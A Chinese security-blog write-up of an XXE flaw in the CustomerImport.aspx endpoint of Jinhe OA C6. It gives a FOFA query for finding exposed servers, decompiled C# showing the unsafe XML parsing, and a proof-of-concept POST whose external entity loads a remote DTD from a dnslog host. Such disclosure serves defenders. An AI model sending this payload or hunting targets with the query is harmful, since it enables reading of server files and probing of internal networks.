---
title: "金和OA CustomerImport.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-ContractManagement-CustomerImport-xxe.html
asset_dir: assets/金和oa-customerimport.aspx-xxe漏洞
---

# 金和OA CustomerImport.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/12/4 13:32
- 277浏览
- [0评论](#comment)
- 12分钟阅读

深入探索

服务器安全服务

安全研究报告

技术文章订阅

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `CustomerImport.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞修复方案

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `CustomerImport.aspx` 在 `bin` 目录下查找 `JHSoft.Web.ContractManagement.dll` 将其进行反编译后找到 **CustomerImport** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  if (this.IsPostBack)
    return;
  ((Control) this).Page.Response.Write(this.ImportData());
  ((Control) this).Page.Response.End();
}
```

跟进 `ImportData` 方法

深入探索

恶意软件分析工具

Web安全书籍

SQL

```
protected string ImportData()
{
  string str1 = string.Empty;
  DateTime now = DateTime.Now;
  string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(end);
  XmlNode documentElement = (XmlNode) xmlDocument.DocumentElement;
```

请求内容直接使 `xmlDataDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/JHSoft.Web.ContractManagement/Importing/CustomerImport.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到HTTP请求

网络安全

[![金和OA CustomerImport.aspx XXE漏洞](images/img-001-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
